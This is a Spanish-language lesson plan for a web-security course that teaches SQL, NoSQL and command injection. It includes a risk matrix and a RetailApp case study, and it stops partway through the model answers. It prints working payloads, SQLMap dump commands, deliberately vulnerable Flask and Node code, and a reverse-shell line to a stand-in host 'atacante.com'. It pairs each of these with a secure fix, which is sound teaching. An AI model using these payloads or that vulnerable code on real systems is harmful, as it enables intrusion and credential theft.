> "Docente: muchos desarrolladores creen que basta con escapar las comillas simples — reemplazar `'` por `\'` o `''`. Esto es INSUFICIENTE porque: (1) hay variantes de SQLi que no usan comillas, como las inyecciones en campos numéricos donde no hay delimitadores de cadena: `SELECT * FROM productos WHERE id=[INPUT]` con input `1 OR 1=1` no tiene comillas. (2) Las codificaciones de caracteres pueden bypassear el escape de comillas — por ejemplo, en algunas configuraciones de MySQL, el carácter multi-byte `0xbf27` puede ser interpretado como una comilla escapada incorrectamente. La única solución robusta son las consultas parametrizadas, punto."

---

**Pregunta al grupo:**

> "Si un campo de búsqueda de productos usa la URL `/buscar?categoria=zapatos` y el desarrollador construye la consulta como `SELECT * FROM productos WHERE categoria='[INPUT]'`, ¿qué payload escribirían para verificar si es vulnerable?"

**Respuesta esperada DETALLADA:**

Para verificar si el campo es vulnerable a SQL injection sin causar daño (solo detección), el primer paso es ingresar una comilla simple: `/buscar?categoria=zapatos'`. Si la aplicación devuelve un error de base de datos como "You have an error in your SQL syntax" o simplemente una página de error diferente a la normal, eso confirma que el input se está incorporando directamente en la consulta SQL. Un segundo paso de verificación es probar con condiciones que deberían ser equivalentes: `/buscar?categoria=zapatos' AND '1'='1` debería devolver los mismos resultados que la búsqueda normal, mientras que `/buscar?categoria=zapatos' AND '1'='2` debería devolver resultados vacíos o un error. Si el comportamiento difiere entre ambas pruebas de forma predecible, el campo es definitivamente vulnerable a SQL injection de tipo boolean-based.

---

### T3. Tipos de SQLi Avanzados — Blind y UNION (15 minutos) {#t3}

#### Boolean-based Blind SQL Injection

En este tipo, la aplicación no muestra datos de la base de datos en su respuesta, pero su comportamiento (contenido de página, código HTTP, tamaño de respuesta) varía según si la condición inyectada es verdadera o falsa. El atacante infiere información bit a bit.

**Ejemplos de payloads:**

```sql
-- Condición VERDADERA (la aplicación responde "normalmente")
' AND 1=1--

-- Condición FALSA (la aplicación responde diferente: página vacía, error, menos contenido)
' AND 1=2--

-- Verificando si el primer carácter del nombre de la base de datos es 't'
' AND SUBSTRING(database(),1,1)='t'--

-- Verificando si el usuario de la base de datos tiene más de 5 caracteres
' AND LENGTH(user())>5--
```

---

#### Time-based Blind SQL Injection

Cuando ni siquiera hay diferencia observable en la respuesta, se usa el tiempo de respuesta como canal de información. Si la consulta tarda más de lo normal, la condición inyectada es verdadera.

```sql
-- MySQL: pausa 5 segundos si la condición es verdadera
' AND IF(1=1, SLEEP(5), 0)--

-- MySQL: pausa 5 segundos incondicionalmente (prueba de concepto)
'; SELECT SLEEP(5)--

-- SQL Server: pausa 5 segundos
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL: pausa 5 segundos
'; SELECT pg_sleep(5)--

-- Extrayendo datos con time-based: ¿es el primer carácter del nombre de usuario 'a'?
' AND IF(SUBSTRING(user(),1,1)='a', SLEEP(5), 0)--
```

---

#### UNION-based SQL Injection

Usa el operador `UNION` de SQL para agregar una consulta adicional cuyo resultado se devuelve en la misma respuesta. Requiere que: (1) la consulta original devuelva resultados visibles en la página, (2) el número de columnas de la consulta inyectada coincida con la original.

```sql
-- Paso 1: Determinar el número de columnas con ORDER BY
' ORDER BY 1--   -- No da error → hay al menos 1 columna
' ORDER BY 2--   -- No da error → hay al menos 2 columnas
' ORDER BY 3--   -- Error → la consulta tiene exactamente 2 columnas

-- Paso 2: Extraer datos del sistema
' UNION SELECT username, password FROM admin--

-- Paso 3: Extraer metadatos (nombres de tablas en MySQL)
' UNION SELECT table_name, table_schema FROM information_schema.tables--

-- Paso 4: Extraer columnas de una tabla específica
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='usuarios'--
```

---

#### Diagrama ASCII — Flujo de ataque Blind SQLi

```
BOOLEAN-BASED BLIND SQL INJECTION — FLUJO COMPLETO

Atacante                              Servidor Web / BD
   |                                         |
   |-- GET /buscar?id=1' AND 1=1-- -------> |
   |                                         | Ejecuta: SELECT ... WHERE id=1 AND 1=1--
   |<-- HTTP 200, contenido normal --------- | (condición verdadera → resultado normal)
   |                                         |
   |-- GET /buscar?id=1' AND 1=2-- -------> |
   |                                         | Ejecuta: SELECT ... WHERE id=1 AND 1=2--
   |<-- HTTP 200, página vacía ------------ | (condición falsa → sin resultados)
   |                                         |
   | [Diferencia detectada → campo vulnerable]
   |                                         |
   |-- GET /buscar?id=1' AND               |
   |   SUBSTRING(database(),1,1)='a'-- --> |
   |<-- página vacía -------------------- | (primer char de BD no es 'a')
   |                                         |
   |-- GET /buscar?id=1' AND               |
   |   SUBSTRING(database(),1,1)='b'-- --> |
   |<-- página vacía -------------------- | (no es 'b')
   |                                         |
   |-- ... (repite para cada carácter)       |
   |                                         |
   |-- GET /buscar?id=1' AND               |
   |   SUBSTRING(database(),1,1)='s'-- --> |
   |<-- HTTP 200, contenido normal -------- | (es 's' → primer carácter inferido)
   |                                         |
   | [Repite para cada posición de cada dato que quiere extraer]
   | [SQLMap automatiza este proceso: miles de requests]
```

---

#### Herramienta real: SQLMap

SQLMap es la herramienta open-source estándar de la industria para detección y explotación automatizada de SQL injection. Disponible en Kali Linux y como proyecto GitHub.

```bash
# Comando básico — detectar si el parámetro 'id' es vulnerable
sqlmap -u "http://objetivo.com/producto?id=1" --dbs

# Flags importantes:
# -u        : URL objetivo
# --dbs     : Enumerar bases de datos disponibles
# --tables  : Enumerar tablas de una base de datos
# --dump    : Extraer datos de una tabla
# --level   : Profundidad de pruebas (1-5, default 1)
# --risk    : Agresividad (1-3, default 1)
# --dbms    : Especificar motor de BD (mysql, postgresql, sqlite, mssql)

# Ejemplo completo — extraer tabla de usuarios de la BD 'empresa'
sqlmap -u "http://objetivo.com/login" \
       --data="usuario=admin&password=test" \
       --method POST \
       --dbms mysql \
       -D empresa \
       -T usuarios \
       --dump

# Para formularios POST con Burp Suite — guardar el request en un archivo
sqlmap -r request.txt --level 3 --risk 2

# IMPORTANTE: Solo usar con autorización explícita del propietario del sistema
# El uso no autorizado es ilegal bajo la Ley de Delitos Informáticos del Perú (Ley 30096)
```

---

**Mini actividad — Clasificar payloads (integrada en los 15 minutos, duración 2 minutos):**

> "Clasifiquen estos 4 payloads según el tipo de SQLi. Tienen 90 segundos."

| Payload | Tipo de SQLi |
|---------|--------------|
| `'; SELECT SLEEP(5)--` | Time-based Blind |
| `' UNION SELECT user(), password FROM mysql.user--` | UNION-based |
| `' AND SUBSTRING(database(),1,1)='m'--` | Boolean-based Blind |
| `' OR '1'='1'--` | Classic / Authentication Bypass |

---

**Pregunta al grupo:**

> "¿Por qué un atacante usaría Time-based Blind SQLi si Boolean-based Blind es más fácil de implementar? ¿Cuándo específicamente elegiría la técnica de tiempo?"

**Respuesta esperada DETALLADA:**

Un atacante elegiría Time-based Blind SQLi en situaciones específicas donde Boolean-based Blind no es viable. El escenario más común es cuando la aplicación devuelve exactamente la misma respuesta HTTP — mismo contenido, mismo código de estado, mismo tamaño de página — tanto si la consulta devuelve resultados como si no. Esto ocurre cuando la aplicación no muestra los datos de la consulta al usuario, sino que solo los usa internamente (por ejemplo, para decidir si redirigir o no). En ese caso, no hay diferencia "visible" entre condición verdadera y falsa para el boolean-based. Sin embargo, el tiempo de respuesta siempre es observable independientemente del contenido. Un segundo escenario es cuando la aplicación usa caché — puede que la respuesta HTML sea idéntica porque viene de caché, pero el tiempo de respuesta refleja si la base de datos ejecutó un SLEEP real. El trade-off es que time-based es mucho más lento (cada verificación requiere esperar el tiempo de pausa) y menos confiable (latencia de red puede generar falsos positivos).

---

### T4. Inyección NoSQL (15 minutos) {#t4}

#### Diferencia fundamental entre SQL y NoSQL

Las bases de datos relacionales (SQL) usan un lenguaje estructurado con sintaxis fija donde las inyecciones modifican esa sintaxis. Las bases de datos NoSQL usan diferentes modelos de datos (documentos, grafos, clave-valor) y sus "consultas" son estructuras de datos (objetos JSON, en el caso de MongoDB). La inyección NoSQL ocurre cuando el atacante puede manipular esa estructura de datos de la consulta — no insertando código SQL, sino inserting operadores del query language de la BD NoSQL.

---

#### NoSQL Injection en MongoDB — Mecanismo

MongoDB usa operadores especiales en sus consultas, prefijados con `$`:
- `$gt` → greater than (mayor que)
- `$lt` → less than (menor que)
- `$ne` → not equal (diferente de)
- `$where` → ejecuta código JavaScript (especialmente peligroso)
- `$regex` → expresión regular

El problema ocurre cuando la aplicación acepta estos operadores como parte del input del usuario sin validar que son objetos, no strings simples.

---

#### Código VULNERABLE — Node.js + MongoDB

```javascript
// ❌ CÓDIGO VULNERABLE — MongoDB Injection
// Archivo: login_vulnerable.js

const express = require('express');
const mongoose = require('mongoose');

const app = express();
app.use(express.json()); // Parsea el body como JSON automáticamente

// Esquema del usuario
const UserSchema = new mongoose.Schema({
    usuario: String,
    password: String,
    role: String
});
const User = mongoose.model('User', UserSchema);

app.post('/login', async (req, res) => {
    // Se extrae directamente del body JSON sin validar
    const { usuario, password } = req.body;
    
    // *** VULNERABILIDAD ***
    // Si req.body es: { "usuario": "admin", "password": "secreto" }
    // La consulta es: User.findOne({ usuario: "admin", password: "secreto" })
    // → Comportamiento esperado
    
    // PERO si el atacante envía:
    // { "usuario": { "$gt": "" }, "password": { "$gt": "" } }
    // La consulta se convierte en:
    // User.findOne({ usuario: { $gt: "" }, password: { $gt: "" } })
    // $gt significa "mayor que" — toda cadena no vacía es mayor que ""
    // Resultado: devuelve el PRIMER usuario de la colección (generalmente admin)
    // El atacante se autentica sin conocer usuario ni contraseña
    
    // VARIANTE con $ne:
    // { "usuario": { "$ne": "nadie" }, "password": { "$ne": "nadie" } }
    // Busca usuario que NO sea "nadie" y password que NO sea "nadie"
    // → Devuelve el primer usuario real de la BD
    
    const user = await User.findOne({
        usuario: usuario,   // ← usuario puede ser un OBJETO, no un string
        password: password  // ← password puede ser un OBJETO con operador $gt
    });
    
    if (user) {
        return res.json({
            mensaje: 'Login exitoso',
            token: 'jwt-generado-aqui',
            rol: user.role  // El atacante obtiene el rol (puede ser 'admin')
        });
    }
    return res.status(401).json({ error: 'Credenciales inválidas' });
});

app.listen(3000);
```

---

#### Payload de ataque — Request HTTP del atacante

```http
POST /login HTTP/1.1
Host: objetivo.com
Content-Type: application/json

{
    "usuario": { "$gt": "" },
    "password": { "$gt": "" }
}
```

**Por qué funciona:**
- MongoDB evalúa `{ usuario: { $gt: "" } }` como: "encuentra documentos donde el campo usuario sea mayor que la cadena vacía"
- En comparación de strings, cualquier string no vacío es mayor que `""`
- Por lo tanto, todos los usuarios de la colección cumplen la condición
- `findOne()` retorna el primer documento encontrado (generalmente el admin)
- La autenticación es bypasseada sin conocer ninguna credencial

**Variante con $where (especialmente peligrosa — ejecuta JavaScript):**
```json
{
    "usuario": "admin",
    "password": { "$where": "this.password.length > 0" }
}
```

---

#### Comparación SQL Injection vs NoSQL Injection

| Característica | SQL Injection | NoSQL Injection (MongoDB) |
|---|---|---|
| **Lenguaje atacado** | SQL (lenguaje de consulta estructurado) | MongoDB Query Language (objetos JSON con operadores) |
| **Mecanismo** | Modificar la sintaxis de la consulta SQL | Inyectar operadores de MongoDB en el objeto de consulta |
| **Payload típico** | `' OR '1'='1'--` (texto) | `{"$gt": ""}` (objeto JSON) |
| **Autenticación bypass** | `' OR '1'='1'--` en campo usuario | `{"$gt": ""}` en campo usuario y password |
| **Extracción de datos** | `UNION SELECT` | `$where` con JavaScript, `$regex` para inferencia |
| **Detección automática** | SQLMap (muy maduro) | NoSQLMap, nosql-injection-fuzzer |
| **Defensa principal** | Consultas parametrizadas | Validación de tipos (rechazar objetos donde se espera string) |

---

#### Código SEGURO — Validación de tipos en Node.js

```javascript
// ✅ CÓDIGO SEGURO — Validación de tipos + sanitización
// Archivo: login_seguro.js

const express = require('express');
const mongoose = require('mongoose');

const app = express();
app.use(express.json());

const User = mongoose.model('User', new mongoose.Schema({
    usuario: String,
    password: String,
    role: String
}));

// Función de validación: verifica que el input sea string y tenga formato válido
function validarCredencial(valor, nombreCampo, maxLength = 100) {
    // Verificar que sea exactamente un string (no un objeto, array, número, etc.)
    if (typeof valor !== 'string') {
        throw new Error(`El campo ${nombreCampo} debe ser una cadena de texto`);
    }
    // Verificar longitud máxima
    if (valor.length > maxLength) {
        throw new Error(`El campo ${nombreCampo} excede la longitud máxima`);
    }
    // Verificar que no esté vacío
    if (valor.trim().length === 0) {
        throw new Error(`El campo ${nombreCampo} no puede estar vacío`);
    }
    return valor.trim();
}

app.post('/login', async (req, res) => {
    try {
        // *** DEFENSA 1: Validar tipos antes de usar en la consulta ***
        const usuario = validarCredencial(req.body.usuario, 'usuario');
        const password = validarCredencial(req.body.password, 'password');
        
        // *** DEFENSA 2: Ahora usuario y password son strings garantizados ***
        // MongoDB no puede interpretar operadores $gt, $ne, etc.
        // porque los valores son strings puros, no objetos
        const user = await User.findOne({
            usuario: usuario,
            password: password
        });
        
        if (user) {
            return res.json({ mensaje: 'Login exitoso', token: 'jwt-aqui' });
        }
        return res.status(401).json({ error: 'Credenciales inválidas' });
        
    } catch (error) {
        // No revelar detalles del error al cliente
        return res.status(400).json({ error: 'Datos de entrada inválidos' });
    }
});

// *** DEFENSA 3 (adicional): Usar express-mongo-sanitize ***
// npm install express-mongo-sanitize
// const mongoSanitize = require('express-mongo-sanitize');
// app.use(mongoSanitize()); // Elimina automáticamente keys que empiezan con $

app.listen(3000);
```

---

**Pregunta al grupo:**

> "Si un desarrollador aplica `JSON.parse()` al body de la request y luego hace `User.findOne({ usuario: body.usuario })`, ¿es suficiente con que la API exija `Content-Type: application/json` para estar protegida contra NoSQL injection?"

**Respuesta esperada DETALLADA:**

No, no es suficiente. Requerir `Content-Type: application/json` solo garantiza que el cliente envía datos en formato JSON — no controla qué estructura tiene ese JSON. Un atacante puede perfectamente enviar un request con `Content-Type: application/json` y body `{"usuario": {"$gt": ""}, "password": {"$gt": ""}}`, que es JSON válido. Cuando `express.json()` parsea ese body, `req.body.usuario` ya es un objeto JavaScript `{$gt: ""}`, no un string. Si ese objeto se pasa directamente a `User.findOne()`, MongoDB lo interpreta como un operador de consulta. La protección real requiere validar el tipo de cada campo antes de usarlo en la consulta — verificar con `typeof valor === 'string'` que lo que llegó es realmente una cadena de texto, no un objeto anidado. Alternativamente, el paquete `express-mongo-sanitize` elimina automáticamente cualquier key de entrada que empiece con `$`, lo que elimina la posibilidad de inyectar operadores de MongoDB.

---

### T5. Inyección de Comandos — Command Injection (10 minutos) {#t5}

#### Definición técnica

La **Inyección de Comandos (Command Injection)** es una vulnerabilidad que ocurre cuando datos controlados por el usuario son pasados a un shell o intérprete del sistema operativo sin suficiente sanitización, permitiendo al atacante ejecutar comandos arbitrarios del sistema operativo en el servidor con los privilegios del proceso web. Es conceptualmente similar a SQL injection, pero en lugar de modificar consultas de base de datos, modifica comandos del sistema operativo.

A diferencia de SQLi, cuyo impacto principal es la exfiltración de datos de la base de datos, command injection puede comprometer el sistema operativo completo: leer cualquier archivo del servidor, crear backdoors, instalar malware, pivotar a otros sistemas de la red interna.

---

#### Código VULNERABLE — Python Flask

```python
# ❌ CÓDIGO VULNERABLE — Command Injection
# Archivo: ping_vulnerable.py
# Escenario: herramienta web de diagnóstico de red que hace ping a un host

import os
from flask import Flask, request

app = Flask(__name__)

@app.route('/ping')
def ping():
    # Un administrador diseñó esta herramienta para diagnosticar conectividad
    # Ejemplo de uso legítimo: /ping?host=8.8.8.8 → ejecuta "ping -c 4 8.8.8.8"
    host = request.args.get('host')
    
    # *** VULNERABILIDAD: input del usuario se pasa directamente al shell ***
    # os.system() ejecuta el string en el shell del sistema operativo (/bin/sh)
    # El shell interpreta caracteres especiales como ; && || | ` $()
    resultado = os.system(f"ping -c 4 {host}")
    
    # Si host = "8.8.8.8" → Ejecuta: ping -c 4 8.8.8.8 (legítimo)
    
    # ATAQUE 1 — usando punto y coma (ejecuta comandos secuenciales):
    # host = "127.0.0.1; cat /etc/passwd"
    # Ejecuta: ping -c 4 127.0.0.1; cat /etc/passwd
    # Muestra el archivo de usuarios del sistema
    
    # ATAQUE 2 — usando && (ejecuta segundo comando solo si el primero tiene éxito):
    # host = "127.0.0.1 && whoami"
    # Ejecuta: ping -c 4 127.0.0.1 && whoami
    # Muestra el usuario con el que corre el servidor web
    
    # ATAQUE 3 — usando | (pipe, pasa salida del primero al segundo):
    # host = "127.0.0.1 | ls -la /var/www/html"
    # Lista los archivos del servidor web
    
    # ATAQUE 4 — reverse shell (el más peligroso):
    # host = "127.0.0.1; bash -i >& /dev/tcp/atacante.com/4444 0>&1"
    # Abre una conexión inversa al servidor del atacante con shell completo
    
    return f"Resultado del ping: {resultado}"

if __name__ == '__main__':
    app.run(debug=True)
```

---

#### Código SEGURO — subprocess con lista de argumentos

```python
# ✅ CÓDIGO SEGURO — subprocess con lista en lugar de shell=True
# Archivo: ping_seguro.py

import subprocess
import re
from flask import Flask, request, jsonify

app = Flask(__name__)

# Lista blanca de hosts permitidos (alternativa más restrictiva)
HOSTS_PERMITIDOS = {'8.8.8.8', '8.8.4.4', '1.1.1.1'}

def validar_host(host: str) -> bool:
    """
    Valida que el host sea una dirección IP válida o un hostname seguro.
    NO permite caracteres especiales del shell.
    """
    if not host or len(host) > 255:
        return False
    # Solo permite: letras, números, puntos y guiones (para hostnames)
    # Excluye: ; & | ` $ ( ) < > ' " \ y espacios
    patron_ip = r'^(\d{1,3}\.){3}\d{1,3}$'
    patron_hostname = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$'
    return bool(re.match(patron_ip, host) or re.match(patron_hostname, host))

@app.route('/ping')
def ping():
    host = request.args.get('host', '').strip()
    
    # *** DEFENSA 1: Validar el formato del host ***
    if not validar_host(host):
        return jsonify({'error': 'Host inválido'}), 400
    
    # *** DEFENSA 2: subprocess con LISTA de argumentos (no string, no shell=True) ***
    # Cuando se pasa una lista, subprocess NO invoca el shell
    # Cada elemento de la lista es un argumento separado — no hay interpretación de metacaracteres
    # Aunque host contenga "; cat /etc/passwd", se pasa como UN SOLO argumento a ping
    # ping intentará hacer ping a la dirección "127.0.0.1; cat /etc/passwd" literalmente
    # y fallará de forma segura (host no encontrado)
    try:
        resultado = subprocess.run(
            ['ping', '-c', '4', host],  # Lista de argumentos — SEGURO
            capture_output=True,
            text=True,
            timeout=10  # Evitar que un atacante bloquee el servidor con pings largos
        )
        return jsonify({
            'host': host,
            'salida': resultado.stdout,
            'errores': resultado.stderr,
            'codigo_retorno': resultado.returncode
        })
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Timeout: el host no respondió en 10 segundos'}), 408
    except Exception as e:
        return jsonify({'error': 'Error al ejecutar ping'}), 500

if __name__ == '__main__':
    app.run(debug=False)
```

---

#### Operadores de encadenamiento de comandos en shell

| Operador | Nombre | Comportamiento | Ejemplo de ataque |
|----------|--------|----------------|-------------------|
| `;` | Separador de comandos | Ejecuta el segundo comando sin importar el resultado del primero | `ping host; cat /etc/passwd` |
| `&&` | AND lógico | Ejecuta el segundo solo si el primero tuvo éxito (exit code 0) | `ping host && whoami` |
| `\|\|` | OR lógico | Ejecuta el segundo solo si el primero falló | `ping host_invalido \|\| id` |
| `\|` | Pipe | Pasa la salida del primero como entrada del segundo | `ping host \| grep -v PING` |
| `` ` `` | Backtick | Ejecuta el comando dentro y sustituye el resultado | ``ping `whoami`.atacante.com`` |
| `$()` | Command substitution | Igual que backtick, sintaxis moderna | `ping $(cat /etc/hostname).atacante.com` |
| `\n` `%0a` | Nueva línea | En algunos contextos, nueva línea inicia un nuevo comando | `ping host%0acat /etc/passwd` |

---

#### Casos reales: Command Injection a gran escala

**Shellshock (CVE-2014-6271, 2014):** Vulnerabilidad en bash que permitía ejecutar código arbitrario a través de variables de entorno. Afectó millones de servidores con CGI (Common Gateway Interface) porque el servidor web pasaba headers HTTP como variables de entorno al script CGI, y si bash procesaba esas variables al iniciarse, ejecutaba el código incrustado. Payload: `() { :;}; /bin/bash -c 'comando'` en el header User-Agent.

**Log4Shell (CVE-2021-44228, 2021):** Vulnerabilidad en la librería Log4j2 de Java (usada por millones de aplicaciones). Cuando la aplicación logueaba strings que contenían `${jndi:ldap://atacante.com/a}`, Log4j los evaluaba como expresiones y realizaba una conexión LDAP al servidor del atacante, que respondía con código Java malicioso que se ejecutaba en el servidor víctima. Afectó a productos de Apple, Microsoft, Amazon, Minecraft y muchos más. Se descubrió en diciembre de 2021.

---

**Pregunta al grupo:**

> "¿Por qué `subprocess.run(['ping', '-c', '4', host])` con una lista es más seguro que `os.system(f'ping -c 4 {host}')` aunque el contenido de `host` sea el mismo en ambos casos?"

**Respuesta esperada DETALLADA:**

La diferencia fundamental está en cómo cada función maneja el argumento. `os.system()` recibe un string y lo pasa directamente al shell del sistema operativo (`/bin/sh`), que es un intérprete completo con capacidad de interpretar metacaracteres especiales como `;`, `&`, `|`, backtick, `$()`, etc. El shell ve el string completo como una "línea de comandos" y la procesa según sus reglas de interpretación. Si el string contiene `; cat /etc/passwd`, el shell ejecuta dos comandos separados.

En cambio, `subprocess.run(['ping', '-c', '4', host])` con una lista no invoca el shell en absoluto — crea el proceso directamente con `execve()` del sistema operativo. Cada elemento de la lista se convierte en un argumento posicional del programa. El programa `ping` recibe exactamente cuatro argumentos: el ejecutable, `-c`, `4` y el valor de `host`. No hay intérprete que procese metacaracteres — `ping` recibe la cadena `127.0.0.1; cat /etc/passwd` como UN SOLO argumento (el host al que debe hacer ping), intentará resolver ese string como dirección IP/hostname, fallará, y terminará. Los caracteres `;`, `cat`, `/etc/passwd` son completamente inofensivos en ese contexto porque nunca son evaluados por un shell.

---

### T6. Matriz de Riesgos OWASP (5 minutos) {#t6}

#### ¿Qué es una Matriz de Riesgos?

Una **Matriz de Riesgos** es una herramienta de gestión que cuantifica el nivel de riesgo de cada vulnerabilidad encontrada, cruzando dos dimensiones:

- **Probabilidad (Likelihood):** ¿Qué tan factible es que esta vulnerabilidad sea explotada? Considera: facilidad de explotación, herramientas disponibles, nivel de habilidad requerido, si la vulnerabilidad es públicamente conocida.

- **Impacto (Impact):** Si la vulnerabilidad es explotada, ¿qué tanto daño causa? Considera: confidencialidad de datos comprometida, integridad de datos, disponibilidad del sistema, impacto financiero y reputacional.

La **escala OWASP** usa: Bajo (1-3), Medio (4-6), Alto (7-9).

**Nivel de Riesgo = Probabilidad × Impacto / Factor normalizador**

Categorías resultantes:
- **CRÍTICO:** Probabilidad Alta + Impacto Alto
- **ALTO:** Probabilidad Alta + Impacto Medio, o Probabilidad Media + Impacto Alto
- **MEDIO:** Probabilidad Media + Impacto Medio, o combinaciones con uno Bajo
- **BAJO:** Probabilidad Baja + Impacto Bajo

---

#### Matriz de Riesgos — Las 3 Inyecciones Estudiadas

| Vulnerabilidad | Probabilidad | Fundamento | Impacto | Fundamento | Nivel de Riesgo | Control Principal |
|---|---|---|---|---|---|---|
| **SQL Injection (Classic)** | Alta (8/9) | Herramientas automáticas (SQLMap), payload simple `' OR '1'='1`, millones de tutoriales disponibles, detectable con un apóstrofe | Alto (9/9) | Exfiltración completa de la BD, bypass de autenticación, en algunas BD puede ejecutar comandos OS (xp_cmdshell en MSSQL) | **CRÍTICO** | Consultas parametrizadas en 100% del código + WAF |
| **NoSQL Injection (MongoDB)** | Media (6/9) | Requiere que la API acepte JSON y no valide tipos; menos conocida que SQLi pero creciente con el auge de aplicaciones Node.js | Alto (8/9) | Bypass de autenticación, exfiltración de documentos, ejecución de JavaScript con $where | **ALTO** | Validación de tipos + express-mongo-sanitize + desactivar operador $where |
| **Command Injection** | Media (5/9) | Menos frecuente que SQLi porque requiere que la app interactúe con el SO, pero cuando existe es trivial de explotar con operadores `;` `&&` | Crítico (9/9) | Acceso completo al sistema operativo, instalación de backdoors, pivoting a la red interna, ransomware | **CRÍTICO** | subprocess con lista (nunca shell=True), whitelist de inputs, principio de mínimo privilegio para el proceso web |

---

**Pregunta al grupo:**

> "En la matriz de riesgos, SQL Injection tiene probabilidad Alta y Command Injection tiene probabilidad Media, pero ambas resultan en nivel CRÍTICO. ¿Cómo explicarían esa aparente contradicción a un gerente no técnico?"

**Respuesta esperada DETALLADA:**

La explicación al gerente sería: el nivel de riesgo combina dos dimensiones — qué tan fácil es atacar (probabilidad) y qué tan grave es el daño si el ataque tiene éxito (impacto). Command injection tiene probabilidad media porque no todas las aplicaciones tienen funciones que llamen al sistema operativo — es menos frecuente como superficie de ataque. Sin embargo, cuando existe, su impacto es máximo: no solo compromete la base de datos (como SQL injection), sino que compromete el servidor completo, lo que potencialmente da acceso a toda la infraestructura de la empresa, no solo a los datos de un sistema. Un atacante con command injection puede instalar malware, robar credenciales de otros sistemas, moverse lateralmente por la red interna y causar daños mucho más allá de la aplicación web original. Por eso, aunque sea menos probable encontrarla, cuando existe debe tratarse con la misma urgencia que SQL injection: ambas representan riesgo crítico que requiere remediación inmediata, no en el próximo sprint.

---

## BLOQUE 3 — PRÁCTICA + CIERRE (50 minutos) {#bloque-3}

---

### 4a. CASO PRÁCTICO GRUPAL — RetailApp (25 minutos) {#caso-practico}

**Instrucción para el docente:** Organizar a los estudiantes en grupos de 3-4 personas. Distribuir el material impreso o compartir por el aula virtual. El docente circula entre grupos haciendo preguntas de andamiaje. A los 20 minutos, hacer puesta en común de 5 minutos.

---

#### Escenario

> **RetailApp** es una startup peruana de e-commerce con 50,000 usuarios registrados. El CTO ha contratado a su equipo como consultores de seguridad para realizar una revisión del código fuente antes del lanzamiento de su aplicación en producción. Han compartido tres fragmentos de código con los que tienen dudas. Su encargo es: identificar vulnerabilidades, clasificarlas según OWASP, construir la matriz de riesgo y proponer el fix.

---

#### Fragmento 1 — Sistema de login (Python Flask + SQLite)

```python
# RetailApp/auth/login.py — Fragmento del sistema de autenticación

import sqlite3
from flask import Flask, request, session

app = Flask(__name__)

@app.route('/api/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    conn = sqlite3.connect('retailapp.db')
    cursor = conn.cursor()
    
    query = "SELECT id, nombre, email, rol FROM usuarios WHERE email='" + email + "' AND password='" + password + "'"
    
    user = cursor.execute(query).fetchone()
    conn.close()
    
    if user:
        session['user_id'] = user[0]
        session['rol'] = user[3]
        return {'status': 'ok', 'nombre': user[1], 'rol': user[3]}
    
    return {'status': 'error', 'mensaje': 'Credenciales incorrectas'}, 401
```

---

#### Fragmento 2 — Búsqueda de productos (Node.js + MongoDB)

```javascript
// RetailApp/api/productos.js — Fragmento del endpoint de búsqueda

const express = require('express');
const Producto = require('../models/Producto');
const router = express.Router();

router.get('/buscar', async (req, res) => {
    const { categoria, precioMin, precioMax } = req.query;
    
    // Construir filtro para MongoDB
    const filtro = {};
    
    if (categoria) {
        filtro.categoria = categoria;
    }
    if (precioMin || precioMax) {
        filtro.precio = {};
        if (precioMin) filtro.precio.$gte = precioMin;
        if (precioMax) filtro.precio.$lte = precioMax;
    }
    
    const productos = await Producto.find(filtro);
    res.json(productos);
});

module.exports = router;
```

---

#### Fragmento 3 — Diagnóstico de red (Python)

```python
# RetailApp/admin/diagnostico.py — Herramienta de diagnóstico para admins

import os
from flask import Flask, request, jsonify

@app.route('/admin/ping', methods=['GET'])
def admin_ping():
    """
    Herramienta interna para que los administradores 
    verifiquen conectividad con servidores de proveedores
    """
    servidor = request.args.get('servidor')
    resultado = os.popen(f"ping -c 3 {servidor} 2>&1").read()
    return jsonify({'resultado': resultado})
```

---

#### Guía de trabajo para los grupos

**Producto esperado — tabla de hallazgos:**

| # | Fragmento | Vulnerabilidad | Categoría OWASP | Probabilidad (1-9) | Impacto (1-9) | Nivel de Riesgo | Fix propuesto |
|---|-----------|----------------|-----------------|-------------------|---------------|-----------------|---------------|
| 1 | login.py | SQL Injection | A03:2021 | | | | |
| 2 | productos.js | NoSQL Injection | A03:2021 | | | | |
| 3 | diagnostico.py | Command Injection | A03:2021 | | | | |

**Preguntas de andamiaje del docente mientras circula:**
- "¿Dónde exactamente está el input del usuario en ese fragmento?"
- "¿Qué payload escribirían para probar si es vulnerable? ¿Qué esperarían ver?"
- "Si el atacante explota esto, ¿qué puede hacer concretamente?"
- "¿Qué cambiaría en el código para eliminar la vulnerabilidad? ¿Solo esa línea?"

---

#### PUESTA EN COMÚN — Respuesta modelo completa

**Hallazgo 1 — login.py — SQL Injection Crítica:**
- **Vulnerabilidad exacta:** Concatenación de email y password directamente en la consulta SQL en la línea `query = "SELECT ... WHERE email='" + email + "' AND password='" + password + "'"`.
- **Payload de verificación:** En el campo email: `test@test.com' OR '1'='1' --` y cualquier password.
- **Consulta resultante:** `SELECT id, nombre, email, rol FROM usuarios WHERE email='test@test.com' OR '1'='1' --' AND password='...'`
- **Impacto concreto:** Bypass de autenticación completo. El atacante accede como el primer usuario de la base de datos (puede ser un admin). Adicionalmente, con `UNION SELECT` podría extraer todos los emails, contraseñas (si están en otra tabla), y datos de tarjetas de crédito.
- **OWASP:** A03:2021 — Injection
- **Probabilidad:** 9/9 (trivial con payload estándar, automatizable con SQLMap)
- **Impacto:** 9/9 (acceso total a BD de 50,000 usuarios con datos financieros)
- **Riesgo:** CRÍTICO
- **Fix:**
```python
# Reemplazar la consulta concatenada por:
query = "SELECT id, nombre, email, rol FROM usuarios WHERE email=? AND password=?"
user = cursor.execute(query, (email, password)).fetchone()
```

**Hallazgo 2 — productos.js — NoSQL Injection (tipo parameter pollution):**
- **Vulnerabilidad exacta:** En la línea `filtro.precio.$gte = precioMin`, el string `precioMin` de la URL se asigna como valor de un operador MongoDB. Si el cliente envía `?precioMin[$gte]=0`, Express puede parsear esto como `precioMin = { $gte: 0 }`, haciendo que `filtro.precio.$gte = { $gte: 0 }` — estructura anidada de operadores. La vulnerabilidad principal es que no se valida que precioMin sea un número, permitiendo inyección de operadores.
